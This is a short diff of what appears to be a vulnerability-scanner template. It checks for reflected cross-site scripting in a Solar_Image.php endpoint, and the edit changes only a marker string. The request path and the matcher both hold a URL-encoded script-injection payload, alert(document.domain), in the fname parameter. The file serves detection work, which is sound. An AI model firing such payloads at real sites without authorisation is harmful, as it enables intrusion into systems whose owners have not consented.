@@ -20,14 +20,14 @@ info:
 requests:
   - method: GET
     path:
-      - '{{BaseURL}}/Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      - '{{BaseURL}}/Solar_Image.php?mode=resize&fname=testnmanp%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
 
     matchers-condition: and
     matchers:
       - type: word
         part: body
         words:
-          - 'value="test"><script>alert(document.domain)</script>">'
+          - 'value="testnmanp"><script>alert(document.domain)</script>">'
 
       - type: word
         part: header
